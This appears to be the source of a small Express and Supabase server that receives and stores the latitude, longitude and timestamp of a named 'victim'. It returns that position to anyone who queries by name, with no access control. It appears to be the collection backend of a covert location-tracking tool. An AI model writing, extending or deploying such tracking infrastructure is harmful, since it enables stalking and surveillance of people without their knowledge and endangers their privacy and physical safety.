const express = require('express')
const { createClient } = require('@supabase/supabase-js')

const app = express()
app.use(express.json())

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_KEY
)

app.post('/', async (req, res) => {
  const body = req.body
  if (body && body.victim && body.lat && body.lon) {
    const { error } = await supabase
      .from('position')
      .upsert({
        victim: body.victim,
        lat: body.lat,
        lon: body.lon,
        ts: body.ts || Date.now()
      })
    if (error) {
      res.status(500).json({ error: 'db error' })
    } else {
      res.json({ ok: true })
    }
  } else {
    res.status(400).json({ error: 'bad request' })
  }
})

app.get('/', async (req, res) => {
  const victim = req.query.victim
  if (!victim) return res.json({ error: 'not found' })
  const { data, error } = await supabase
    .from('position')
    .select('victim, lat, lon, ts')
    .eq('victim', victim)
    .maybeSingle()
  if (error) return res.status(500).json({ error: 'db error' })
  res.json(data || { error: 'not found' })
})

app.listen(process.env.PORT || 8080)
